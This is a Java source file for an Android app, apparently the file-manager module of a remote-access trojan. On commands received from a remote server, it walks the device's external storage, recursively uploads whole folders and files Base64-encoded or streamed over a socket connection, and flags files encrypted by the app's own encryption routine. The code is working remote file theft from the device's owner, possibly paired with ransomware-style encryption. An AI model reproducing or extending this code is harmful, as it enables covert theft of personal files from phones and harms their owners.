package com.fason.app.features.storage;

import android.os.Environment;
import android.util.Base64;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.TransferHelper;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.util.Arrays;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class FileManager {
    private static final ExecutorService exec = Executors.newSingleThreadExecutor();

    public static File safeFile(String path) {
        if (path == null || path.isEmpty()) return null;
        try {
            File f = new File(path).getCanonicalFile();
            File ext = Environment.getExternalStorageDirectory().getCanonicalFile();
            File cache = FasonApp.getContext().getCacheDir().getCanonicalFile();
            String fp = f.getAbsolutePath();
            if (fp.startsWith(ext.getAbsolutePath() + "/") || fp.equals(ext.getAbsolutePath())
                || fp.startsWith(cache.getAbsolutePath() + "/") || fp.equals(cache.getAbsolutePath())) {
                return f;
            }
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    public JSONArray walk(String path) {
        JSONArray arr = new JSONArray();
        try {
            if (path == null || path.isEmpty()) {
                path = Environment.getExternalStorageDirectory().getAbsolutePath();
            }
            File dir = safeFile(path);
            if (dir == null || !dir.exists() || !dir.canRead()) {
                sendError("Access denied", path, null);
                return arr;
            }
            File parent = dir.getParentFile();
            if (parent != null && safeFile(parent.getAbsolutePath()) != null) {
                JSONObject p = new JSONObject();
                p.put(Protocol.KEY_NAME, "../");
                p.put(Protocol.KEY_ISDIR, true);
                p.put(Protocol.KEY_PATH, parent.getAbsolutePath());
                arr.put(p);
            }
            File[] files = dir.listFiles();
            if (files != null) {
                Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() && !b.isDirectory()) return -1;
                    if (!a.isDirectory() && b.isDirectory()) return 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });
                for (File f : files) {
                    if (f.getName().startsWith(".")) continue;
                    JSONObject obj = new JSONObject();
                    obj.put(Protocol.KEY_NAME, f.getName());
                    obj.put(Protocol.KEY_ISDIR, f.isDirectory());
                    obj.put(Protocol.KEY_PATH, f.getAbsolutePath());
                    obj.put(Protocol.KEY_SIZE, f.length());
                    obj.put(Protocol.KEY_LAST_MODIFIED, f.lastModified());
                    if (f.isFile() && f.length() >= 2 && f.canRead()) {
                        obj.put("encrypted", isFasonEncrypted(f));
                    } else {
                        obj.put("encrypted", false);
                    }
                    arr.put(obj);
                }
            }
        } catch (Exception ignored) {}
        return arr;
    }

    public void downloadFile(String path, String cmdId) {
        if (path == null) return;
        exec.execute(() -> {
            File file = safeFile(path);
            if (file == null) { sendError("Access denied (path outside allowed roots)", path, cmdId); return; }
            if (!file.exists()) { sendError("Not found", path, cmdId); return; }
            if (!file.canRead()) { sendError("Cannot read", path, cmdId); return; }
            if (file.isDirectory()) {
                downloadFolderRecursive(file, cmdId);
                return;
            }
            if (file.length() == 0) { sendError("Empty file", path, cmdId); return; }
            downloadSingleFile(file, cmdId);
        });
    }

    private void downloadFolderRecursive(File dir, String cmdId) {
        File[] children = dir.listFiles();
        if (children == null) {
            sendError("Cannot list directory", dir.getAbsolutePath(), cmdId);
            return;
        }
        for (File child : children) {
            if (child.isDirectory()) {
                downloadFolderRecursive(child, cmdId);
            } else if (child.isFile() && child.canRead() && child.length() > 0) {
                downloadSingleFile(child, cmdId);
            }
        }
    }

    private void downloadSingleFile(File file, String cmdId) {
        String path = file.getAbsolutePath();
        try {
            if (TransferHelper.shouldChunk(file.length())) {
                JSONObject meta = new JSONObject();
                meta.put(Protocol.KEY_NAME, file.getName());
                meta.put(Protocol.KEY_PATH, path);
                attachCmdId(meta, cmdId);
                TransferHelper.streamFile(
                    SocketClient.getInstance().getSocket(),
                    Protocol.FILES, file, meta);
            } else {
                byte[] data = TransferHelper.readSmallFile(file);
                if (data == null) { sendError("Read failed", path, cmdId); return; }
                JSONObject obj = new JSONObject();
                obj.put(Protocol.KEY_TYPE, Protocol.TYPE_DOWNLOAD);
                obj.put(Protocol.KEY_NAME, file.getName());
                obj.put(Protocol.KEY_BUFFER, Base64.encodeToString(data, Base64.NO_WRAP));
                obj.put(Protocol.KEY_PATH, path);
                obj.put(Protocol.KEY_SIZE, data.length);
                attachCmdId(obj, cmdId);
                SocketClient.getInstance().getSocket().emit(Protocol.FILES, obj);
            }
        } catch (OutOfMemoryError e) {
            sendError("Out of memory", path, cmdId);
        } catch (Exception e) {
            sendError("Error: " + e.getMessage(), path, cmdId);
        }
    }

    private void sendError(String msg, String path, String cmdId) {
        try {
            JSONObject err = new JSONObject();
            err.put(Protocol.KEY_TYPE, Protocol.TYPE_ERROR);
            err.put(Protocol.KEY_ERROR, msg);
            if (path != null) err.put(Protocol.KEY_PATH, path);
            attachCmdId(err, cmdId);
            SocketClient.getInstance().getSocket().emit(Protocol.FILES, err);
        } catch (Exception ignored) {}
    }

    private void attachCmdId(JSONObject obj, String cmdId) {
        if (cmdId != null && !cmdId.isEmpty()) {
            try { obj.put(Protocol.KEY_CMD_ID, cmdId); } catch (Exception ignored) {}
        }
    }

    private static boolean isFasonEncrypted(File f) {
        return FilesEncryptDecrypt.isEncrypted(f.getAbsolutePath());
    }
}
